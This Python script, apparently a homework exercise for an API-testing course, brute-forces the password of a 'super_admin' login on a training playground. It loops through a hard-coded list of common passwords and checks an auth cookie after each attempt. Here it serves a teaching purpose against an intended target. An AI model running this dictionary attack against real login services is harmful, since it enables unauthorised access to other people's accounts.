import requests

url_zapros = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"

srt_passwords = ['password','password','123456','123456','123456','123456','123456','123456','123456',
                 '123456','123456','password','password','password','password','password','password','123456789',
                 '12345678','12345678','12345678','12345','12345678','12345','12345678','123456789','qwerty',
                 'qwerty','abc123','qwerty','12345678','qwerty','12345678','qwerty','12345678','password',
                 'abc123','qwerty','abc123','qwerty','12345','football','12345','12345','1234567',
                 'monkey','monkey','123456789','123456789','123456789','qwerty','123456789','111111','12345678',
                 '1234567','letmein','111111','1234','football','1234567890','letmein','1234567','12345',
                 'letmein','dragon','1234567','baseball','1234','1234567','1234567','sunshine','iloveyou',
                 'trustno1','111111','iloveyou','dragon','1234567','princess','football','qwerty','111111',
                 'dragon','baseball','adobe123[a]','football','baseball','1234','iloveyou','iloveyou','123123',
                 'baseball','iloveyou','123123','1234567','welcome','login','admin','princess','abc123',
                 '111111','trustno1','admin','monkey','1234567890','welcome','welcome','admin','qwerty123',
                 'iloveyou','1234567','1234567890','letmein','abc123','solo','monkey','welcome','1q2w3e4r',
                 'master','sunshine','letmein','abc123','111111','abc123','login','666666','admin',
                 'sunshine','master','photoshop[a]','111111','1qaz2wsx','admin','abc123','abc123','qwertyuiop',
                 'ashley','123123','1234','mustang','dragon','121212','starwars','football','654321',
                 'bailey','welcome','monkey','access','master','flower','123123','123123','555555',
                 'passw0rd','shadow','shadow','shadow','monkey','passw0rd','dragon','monkey','lovely',
                 'shadow','ashley','sunshine','master','letmein','dragon','passw0rd','654321','7777777',
                 '123123','football','12345','michael','login','sunshine','master','!@#$%^&*','welcome',
                 '654321','jesus','password1','superman','princess','master','hello','charlie','888888',
                 'superman','michael','princess','696969','qwertyuiop','hottie','freedom','aa123456','princess',
                 'qazwsx','ninja','azerty','123123','solo','loveme','whatever','donald','dragon',
                 'michael','mustang','trustno1','batman','passw0rd','zaq1zaq1','qazwsx','password1','password1',
                 'Football','password1','000000','trustno1','starwars','password1','trustno1','qwerty123','123qwe']
print(srt_passwords[0])
print(len(srt_passwords))
num_pass = len(srt_passwords)

for i in range(num_pass):
    print('  ')
    print(' pass number ',i)
    payload = {"login":"super_admin", "password":srt_passwords[i]}
    response1 = requests.post(url_zapros, data=payload)
    print(' response text = ',response1.text)
    print(' response cookies = ',response1.cookies)
    print(' response headers = ',response1.headers)
    cookie_value = response1.cookies.get('auth_cookie')
    print(' cookie value = ',cookie_value)
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookies)
    print(' response2 text =',response2.text)
    print(' There is no NOT in response2 text? ', not 'NOT' in response2.text)
    if not 'NOT' in response2.text:
        print(' ')
        print(' -------------------------------------- ')
        print(' pass number ',i,'  Password = ', srt_passwords[i])
        break

if i==num_pass-1: print(' --------> Shit !!!!!!!')  # Shit happens...

